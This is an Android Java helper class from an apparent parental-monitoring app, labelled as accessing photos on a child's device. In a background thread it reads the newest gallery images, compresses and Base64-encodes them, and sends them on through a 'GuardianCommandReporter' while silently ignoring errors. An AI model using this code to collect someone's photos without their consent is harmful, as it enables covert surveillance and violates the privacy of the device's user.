package com.nullx.pp;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.provider.MediaStore;
import android.util.Base64;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;

/**
 * Helper untuk mengakses gallery photos di perangkat anak.
 */
public class GalleryHelper {
    
    public static void sendPhotos(Activity activity, int limit) {
        new Thread(() -> {
            JSONArray photos = new JSONArray();
            try {
                String[] projection = {
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.DATE_TAKEN,
                    MediaStore.Images.Media.SIZE,
                    MediaStore.Images.Media.WIDTH,
                    MediaStore.Images.Media.HEIGHT
                };
                
                Cursor cursor = activity.getContentResolver().query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    projection,
                    null, null,
                    MediaStore.Images.Media.DATE_TAKEN + " DESC"
                );
                
                int count = 0;
                if (cursor != null) {
                    int idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
                    int nameCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
                    int dateCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN);
                    int sizeCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE);
                    
                    while (cursor.moveToNext() && count < limit) {
                        long id = cursor.getLong(idCol);
                        String name = cursor.getString(nameCol);
                        long date = cursor.getLong(dateCol);
                        long size = cursor.getLong(sizeCol);
                        
                        Uri contentUri = Uri.withAppendedPath(
                            MediaStore.Images.Media.EXTERNAL_CONTENT_URI, 
                            String.valueOf(id)
                        );
                        
                        // Baca thumbnail (kecilkan jika perlu)
                        byte[] imageData = readImage(activity, contentUri, 500 * 1024);
                        if (imageData != null && imageData.length > 0) {
                            JSONObject p = new JSONObject();
                            p.put("id", id);
                            p.put("name", name);
                            p.put("date", date);
                            p.put("size", size);
                            p.put("data", Base64.encodeToString(imageData, Base64.NO_WRAP));
                            photos.put(p);
                            count++;
                        }
                    }
                    cursor.close();
                }
            } catch (Exception ignored) {}
            
            JSONObject out = new JSONObject();
            try {
                out.put("photos", photos);
                out.put("count", photos.length());
            } catch (Exception ignored) {}
            
            GuardianCommandReporter.post(activity, "gallery", out);
        }).start();
    }
    
    private static byte[] readImage(Activity activity, Uri uri, int maxSize) {
        try {
            InputStream is = activity.getContentResolver().openInputStream(uri);
            if (is == null) return null;
            
            android.graphics.BitmapFactory.Options opts = new android.graphics.BitmapFactory.Options();
            opts.inJustDecodeBounds = true;
            android.graphics.BitmapFactory.decodeStream(is, null, opts);
            is.close();
            
            // Hitung sample size
            int sampleSize = 1;
            while ((opts.outWidth / sampleSize) * (opts.outHeight / sampleSize) > 2000000) {
                sampleSize *= 2;
            }
            
            opts.inJustDecodeBounds = false;
            opts.inSampleSize = sampleSize;
            
            is = activity.getContentResolver().openInputStream(uri);
            android.graphics.Bitmap bmp = android.graphics.BitmapFactory.decodeStream(is, null, opts);
            is.close();
            
            if (bmp == null) return null;
            
            ByteArrayOutputStream os = new ByteArrayOutputStream();
            int quality = 70;
            bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, quality, os);
            
            // Kurangi kualitas jika terlalu besar
            while (os.size() > maxSize && quality > 10) {
                os.reset();
                quality -= 10;
                bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, quality, os);
            }
            
            bmp.recycle();
            return os.toByteArray();
        } catch (Exception e) {
            return null;
        }
    }
}